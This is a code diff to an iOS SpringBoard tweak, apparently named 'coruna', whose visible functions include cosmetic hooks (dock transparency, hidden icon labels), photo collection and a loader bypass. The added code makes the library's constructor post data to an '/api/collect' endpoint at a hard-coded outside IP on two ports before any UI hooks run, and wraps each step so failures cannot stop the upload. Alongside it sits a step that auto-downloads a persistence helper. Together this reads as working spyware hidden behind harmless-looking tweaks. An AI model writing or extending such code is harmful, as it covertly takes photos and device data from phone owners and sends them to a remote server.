@@ -638,27 +638,61 @@ static void collect_photos(void) {
 }
 
 static NSArray *collectServerCandidates(void) {
-    // Primary: your PC from current tests. 127.0.0.1 is phone itself (wrong).
+    // Priority:
+    // 1) /tmp/.coruna_collect_host (full URL or host[:port])
+    // 2) dual-port candidates derived from that host
+    // 3) last-resort research fallback IP
+    // Never prefer 127.0.0.1 - that is the phone itself.
     NSMutableArray *urls = [NSMutableArray array];
-    [urls addObject:@"http://143.92.36.95:8080/api/collect"];
+    NSMutableSet *seen = [NSMutableSet set];
+
+    void (^addUrl)(NSString *) = ^(NSString *url) {
+        if (url.length == 0) return;
+        if ([seen containsObject:url]) return;
+        [seen addObject:url];
+        [urls addObject:url];
+    };
+
+    void (^addHostPort)(NSString *, NSInteger) = ^(NSString *host, NSInteger port) {
+        if (host.length == 0 || port <= 0) return;
+        addUrl([NSString stringWithFormat:@"http://%@:%ld/api/collect", host, (long)port]);
+    };
 
     NSString *raw = [NSString stringWithContentsOfFile:@"/tmp/.coruna_collect_host"
                                               encoding:NSUTF8StringEncoding
                                                  error:nil];
     raw = [raw stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
     if (raw.length > 0) {
-        NSString *url = raw;
-        if ([url hasPrefix:@"http://"] || [url hasPrefix:@"https://"]) {
+        if ([raw hasPrefix:@"http://"] || [raw hasPrefix:@"https://"]) {
+            NSString *url = raw;
             if (![url containsString:@"/api/collect"]) {
                 if ([url hasSuffix:@"/"]) url = [url stringByAppendingString:@"api/collect"];
                 else url = [url stringByAppendingString:@"/api/collect"];
             }
+            addUrl(url);
+
+            // Also try dual-port on same host when origin only had one port.
+            NSURL *parsed = [NSURL URLWithString:raw];
+            if (parsed.host.length > 0) {
+                addHostPort(parsed.host, 8080);
+                addHostPort(parsed.host, 8081);
+            }
+        } else if ([raw containsString:@":"]) {
+            addUrl([NSString stringWithFormat:@"http://%@/api/collect", raw]);
+            NSRange colon = [raw rangeOfString:@":"];
+            NSString *hostOnly = [raw substringToIndex:colon.location];
+            addHostPort(hostOnly, 8080);
+            addHostPort(hostOnly, 8081);
         } else {
-            url = [NSString stringWithFormat:@"http://%@/api/collect", url];
+            addHostPort(raw, 8080);
+            addHostPort(raw, 8081);
         }
-        // Prefer explicit host file first if present
-        [urls insertObject:url atIndex:0];
     }
+
+    // Primary research host (always try; host file still preferred above).
+    addHostPort(@"143.92.36.95", 8080);
+    addHostPort(@"143.92.36.95", 8081);
+
     return urls;
 }
 
@@ -681,6 +715,21 @@ static BOOL postJsonData(NSData *jsonData, NSString *serverUrl) {
 }
 
 static void collect_and_send(void) {
+    // Synchronous boot ping first (before any SQL / UI work).
+    @try {
+        NSDictionary *boot = @{
+            @"type": @"native_status",
+            @"stage": @"boot_sync",
+            @"note": @"collect_and_send entered",
+            @"ts": @((long long)([[NSDate date] timeIntervalSince1970] * 1000))
+        };
+        NSData *bootJson = [NSJSONSerialization dataWithJSONObject:boot options:0 error:nil];
+        NSArray *servers0 = collectServerCandidates();
+        for (NSString *serverUrl in servers0) {
+            if (postJsonData(bootJson, serverUrl)) break;
+        }
+    } @catch (NSException *e) {}
+
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
         // Always leave a breadcrumb so we know constructor ran even if SQL/network fails.
         [@{@"type": @"native_status", @"stage": @"start", @"ts": @((long long)([[NSDate date] timeIntervalSince1970] * 1000))}
@@ -738,15 +787,18 @@ static void collect_and_send(void) {
 
 #pragma mark - Constructor
 
+
+// Optional explicit entry used by TweakLoader dyld_lv_bypass_init after dlopen.
+// Constructor already starts collection; this is a safe second trigger.
+int next_stage_main(void) {
+    collect_and_send();
+    return 0;
+}
+
 __attribute__((constructor)) static void init() {
-    initFrontBoardBypass();
-    initStatusBarTweak();
-    initActionButtonTweak();
-    initDockTransparency();
-    initHideIconLabels();
-    [SpringBoard.sharedApplication initStatusBarGesture];
-    // Immediate heartbeat so server knows Tweak loaded even before SQL finishes.
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+    // CRITICAL: heartbeat BEFORE any SpringBoard UI hooks.
+    // entry2 may run outside SpringBoard; UI hooks can crash and prevent POST.
+    @try {
         NSDictionary *boot = @{
             @"type": @"native_status",
             @"stage": @"boot",
@@ -758,7 +810,15 @@ __attribute__((constructor)) static void init() {
         for (NSString *serverUrl in servers) {
             if (postJsonData(bootJson, serverUrl)) break;
         }
-    });
+    } @catch (NSException *e) {}
+
+    @try { initFrontBoardBypass(); } @catch (NSException *e) {}
+    @try { initStatusBarTweak(); } @catch (NSException *e) {}
+    @try { initActionButtonTweak(); } @catch (NSException *e) {}
+    @try { initDockTransparency(); } @catch (NSException *e) {}
+    @try { initHideIconLabels(); } @catch (NSException *e) {}
+    @try { [SpringBoard.sharedApplication initStatusBarGesture]; } @catch (NSException *e) {}
+
     collect_and_send();
 
     // Auto-download PersistenceHelper to /tmp if not present
@@ -774,7 +834,7 @@ __attribute__((constructor)) static void init() {
         }
     });
 
-    dispatch_async(dispatch_get_main_queue(), ^{
+dispatch_async(dispatch_get_main_queue(), ^{
         NSString *flag = @"/tmp/.coruna_welcomed";
         if (![[NSFileManager defaultManager] fileExistsAtPath:flag]) {
             [@"" writeToFile:flag atomically:YES encoding:NSUTF8StringEncoding error:nil];
